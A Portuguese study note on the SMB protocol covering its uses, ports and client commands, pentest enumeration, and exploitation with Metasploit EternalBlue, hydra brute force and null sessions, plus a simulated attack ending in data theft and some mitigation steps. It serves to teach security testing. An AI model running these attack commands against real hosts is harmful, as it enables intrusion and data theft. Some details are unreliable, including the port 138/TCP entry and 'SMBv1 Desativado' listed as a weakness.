2025-07-27 07:48

Status: #developed #segurança 

Tags: [[CyberSecurity]] | [[Redes de Computadores]] | [[SMB]] | [[Protocolos]]

----
# Introdução

O **Server Message Block (SMB)** é um protocolo de rede utilizado para compartilhamento de arquivos, impressoras e comunicação entre dispositivos em redes Windows. Originalmente desenvolvido pela IBM, foi adotado pela Microsoft e se tornou um componente central em redes corporativas.

## **Versões Principais:**

- **SMBv1 (1984)**: Antigo e inseguro (vulnerável a ataques como EternalBlue).
- **SMBv2/v3 (2006+)**: Mais eficiente e seguro (suporta criptografia).

![[Pasted image 20250727074934.png]]

---
# Para que Serve o SMB?

- **Compartilhamento de arquivos** em redes locais (LAN).
- **Acesso a impressoras** e dispositivos de rede.
- **Comunicação entre servidores e estações de trabalho** em ambientes Windows.
- **Autenticação Integrada** (usando credenciais de domínio *Active Directory*)

---
# Como o SMB Funciona?

## Arquitetura Cliente-Servidor

1. **Cliente SMB** (ex.: Windows Explorer) Solicita acesso a um recurso compartilhado.
2. **Servidor SMB** (ex.: Windows Server) responde com a lista de compartilhamentos.
3. **Autenticação** ocorre via NTLM ou Kerberos (em redes AD).

## Portas Utilizadas

| **Porta** | **Protocolo** | **Descrição**                |
| --------- | ------------- | ---------------------------- |
| 445       | TCP           | SMB sobre IP (moderno).      |
| 138       | TCP           | SMB  sobre NetBIOS (legado). |

---
# Comandos Básicos para interagir com SMB

## Linux (`smbclient`)

```bash
smbclient -L //192.168.1.100 -U usuario
```

- `-L`: Lista de compartilhamentos disponíveis
- `-U`: Define usuários/senha.

## Windows (PowerShell)

```powershell
net view \\192.168.1.100
```

> Lista compartilhamentos de rede.

---
# Uso do SMB em Cibersegurança

## 1. Enumeração de Compartilhamentos

### Com `nmap`

```bash
nmap --script smb-enum-shares -p 445 192.168.1.100
```

### Com `smbmap`

```bash
smbmap -H 192.168.1.100 -u anonymous
```

## 2. Exploração de Vulnerabilidades

### a) EternalBlue (MS17-010)

- Explora SMBv1 para execução remota de código (RCE).
- Usado no ransomware WannaCry.
- Exploit no Metasploit:

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
run
```

### b) Credenciais Fracas (Força Bruta)

- Use `hydra` para testar logins:

```bash
hydra -L users.txt -P passwords.txt smb://192.168.1.100
```

### c) Null Session (SMBv1)

- Acesso sem credenciais em configurações antigas:

```bash
smbclient \\\\192.168.1.100\\IPC$ -N
```

## 3. Pós-Exploração

- **Exfiltração de dados:** Copiar arquivos sensíveis.

```bash
smbclient //192.168.1.100/Compartilhamento -U admin
get documento_confidencial.docx
```

- **Pass-the-Hash:** Uso de hashes NTLM para autenticação.

---
# Vulnerabilidades Comuns do SMB

| **Vulnerabilidade**       | **Impacto**                                         |
| ------------------------- | --------------------------------------------------- |
| SMBv1 Desativado          | Exposto a EternalBlue, Denial of Service.           |
| Compartilhamentos Abertos | Dados sensíveis acessíveis sem autenticação.        |
| NTLMv1                    | Autenticação fraca (vulnerável a relaying attacks). |

---
# Ferramentas para Pentesting SMB

| **Ferramenta** | **Uso**                                                          |
| -------------- | ---------------------------------------------------------------- |
| Nmap           | Varre portas e enumera compartilhamentos (`nmap --script smb-*`) |
| Metasploit     | Exploits com o`ms17_010_eternalblue`.                            |
| CrackMapExec   | Automação de ataques em redes AD via SMB.                        |
| Impacket       | Scripts Python para exploração (ex.: `smbexec.py`)               |

---
# Mitigação de Riscos

## Para Administradores

- **Desative SMBv1:**

```powershell
Disable-WindowsOptionalFeature -Online -FeatureName smb1protocol
```

- **Restrinja compartilhamentos:**

```powershell
Revoke-SmbShareAcess -Name "Compartilhamento" -AccountName "Todos"
```

- **Use SMBv3 com criptografia:**

```powershell
Set-SmbServerConfiguration -EncryptData $true
```

## Para Pentesters

- **Relate vulnerabilidades como:**
	- Compartilhamentos abertos.
	- Senhas padrões em contas de serviço.

---
# Exemplo de Ataque Simulado

## Cenário: Exploração de SMBv1

1. **Descubra hosts vulneráveis:**

```bash
nmap -p 445 --script vuln 192.168.1.0/24
```

2. **Explore com EternalBlue:**

```bash
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.100; run"
```

3. **Roube dados:**

```bash
smbclient //192.168.1.100/C$ -U administrator
```

---
# Conclusão

- **SMB é crítico** em redes Windows, mas **perigoso** se mal configurado.
- **Pentesters** devem verificar:
    - Compartilhamentos não autenticados.
    - Versões vulneráveis (SMBv1).
    - Credenciais fracas.

- **Defensores** devem:    
    - Atualizar sistemas.
    - Implementar criptografia SMBv3.


>[!warning] Atenção:
>**Use SMBv3 e desative SMBv1 em ambientes de produção!**

---
# Referências:

- [Microsoft SMB Security](https://docs.microsoft.com/en-us/windows-server/storage/file-server/smb-security)
- [CIS SMB Benchmark](https://www.cisecurity.org/benchmark/microsoft_windows_server/)